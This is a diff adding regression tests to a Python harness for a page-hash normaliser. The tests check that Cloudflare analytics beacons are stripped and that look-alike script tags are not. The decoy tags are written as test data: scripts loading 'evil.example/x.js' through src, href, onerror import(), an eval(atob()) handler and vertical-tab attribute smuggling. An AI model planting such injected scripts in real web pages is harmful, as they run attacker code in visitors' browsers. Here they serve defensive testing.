@@ -20,6 +20,7 @@ import importlib.util
 import io
 import json
 import pathlib
+import re
 import shutil
 import sys
 import tempfile
@@ -2133,6 +2134,61 @@ def main():
     check("text report prints a GONE row for both sites every run",
           txt.count("GONE (") >= 2 and "fantastic-cactus-db1344" in txt and "fantastic-choux-4f510f" in txt, True)
     check("GONE rows are not listed in the issue-comment body", "GONE" in nd.render_issue_comment_body(clean_plus_gone + [bf], 2), False)
+
+    # -------------------------------------------------------------------------------
+    print("\ngh-2289: Cloudflare-injected Web Analytics beacon must not move the content hash")
+    # -------------------------------------------------------------------------------
+    page_path = HERE / "netlify-drift-fixtures" / "stohlerroof-bridge.page.txt"
+    clean = page_path.read_bytes()
+    beacon_a = (b'        <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vAAAA1"'
+                b' integrity="sha512-AAAA" data-cf-beacon=\'{"version":"2024.11.0","token":"tok-a","r":1,"spa":2}\''
+                b' crossorigin="anonymous"></script>\n')
+    beacon_b = beacon_a.replace(b"vAAAA1", b"vBBBB2").replace(b"sha512-AAAA", b"sha512-BBBB").replace(b"tok-a", b"tok-b")
+    variant_a = clean.replace(b"</body>", beacon_a + b"</body>", 1)
+    variant_b = clean.replace(b"</body>", beacon_b + b"</body>", 1)
+    h = lambda b: hashlib.sha256(nd.normalise_page_bytes(b)).hexdigest()
+    check("gh-2289: fixture page contains </body> (test harness sanity)", b"</body>" in clean, True)
+    check("gh-2289: beacon variants differ in raw bytes (the pre-fix failure)",
+          hashlib.sha256(variant_a).hexdigest() != hashlib.sha256(variant_b).hexdigest(), True)
+    check("gh-2289: variant A (beacon release A) hashes equal to the clean page", h(variant_a), h(clean))
+    check("gh-2289: variant B (beacon release B) hashes equal to the clean page", h(variant_b), h(clean))
+    check("gh-2289: pinned fixture baseline equals the normalised hash of the captured page",
+          nd._load_content_baseline("stohlerroof-bridge.json")[0], h(clean))
+    changed = clean.replace(b"operated by <strong>Dustin Stohler personally</strong>",
+                            b"operated by <strong>Someone Else</strong>", 1)
+    check("gh-2289 negative control: a genuinely edited page hashes DIFFERENTLY",
+          h(changed) != h(clean) and h(variant_a.replace(b"Dustin Stohler", b"Someone Else")) != h(clean), True)
+    check("gh-2289 negative control: an extra non-Cloudflare script is NOT stripped",
+          h(clean.replace(b"</body>", b'<script src="https://evil.example/x.js"></script></body>', 1)) != h(clean), True)
+    cf = b"https://static.cloudflareinsights.com/beacon.min.js"
+    decoys = {
+        "data-src + evil src": b'<script data-src="' + cf + b'" src="https://evil.example/x.js"></script>',
+        "evil src first, CF src second": b'<script src="https://evil.example/x.js" src="' + cf + b'"></script>',
+        "x-src + evil src": b'<script x-src="' + cf + b'" src="https://evil.example/x.js"></script>',
+        "SVG script href": b'<svg><script src="' + cf + b'" href="https://evil.example/x.js"></script></svg>',
+        "SVG script xlink:href": b'<svg><script src="' + cf + b'" xlink:href="https://evil.example/x.js"></script></svg>',
+        "CF src + unknown nonce attr": b'<script src="' + cf + b'" nonce="x"></script>',
+        "0x0B before data-cf-beacon value": b'<script data-cf-beacon=\x0b"a src=https://evil.example/x.js b" src="' + cf + b'"></script>',
+        "0x0B before type value": b'<script type=\x0b"a src=https://evil.example/x.js b" src="' + cf + b'"></script>',
+        "svg close with 0x0B is not a close": b'<svg></svg\x0b><script src="' + cf + b'"></script>',
+        "CF src + onerror import": b'<script src="' + cf + b'/nope" onerror="import(\'https://evil.example/x.js\')"></script>',
+        "CF src + ONLOAD eval": b'<script src="' + cf + b'" ONLOAD="eval(atob(\'YWxlcnQoMSk=\'))"></script>',
+        "CF src + inline body": b'<script src="' + cf + b'">alert(1)</script>',
+        "CF src + onload containing =>": b'<script src="' + cf + b'" onload="x=>{evil()}"></script>',
+    }
+    for name, tag in decoys.items():
+        # base = the same decoy with its <script></script> element cut out, so a stripped
+        # script hashes equal to base and only the script itself decides pass/fail.
+        base = clean.replace(b"</body>", tag[:tag.index(b"<script")] + tag[tag.index(b"</script>") + 9:] + b"</body>", 1)
+        check("gh-2289 negative control: decoy NOT stripped (%s)" % name,
+              h(clean.replace(b"</body>", tag + b"</body>", 1)) != h(base), True)
+    beacon_defer = b'<script defer src="' + cf + b'/vXXXX" data-cf-beacon=\'{"token":"tok-c"}\'></script>'
+    check("gh-2289: real beacon, defer shape, still stripped",
+          h(clean.replace(b"</body>", beacon_defer + b"</body>", 1)), h(clean))
+    visible = re.sub(rb"<[^>]+>", b"", nd.normalise_page_bytes(variant_a))
+    visible = re.sub(rb"\s+", b" ", visible)
+    check("gh-2289: D-174 disclosure 'operated by Dustin Stohler personally' survives normalisation",
+          b"operated by Dustin Stohler personally" in visible, True)
 
     print()
     if FAILURES:
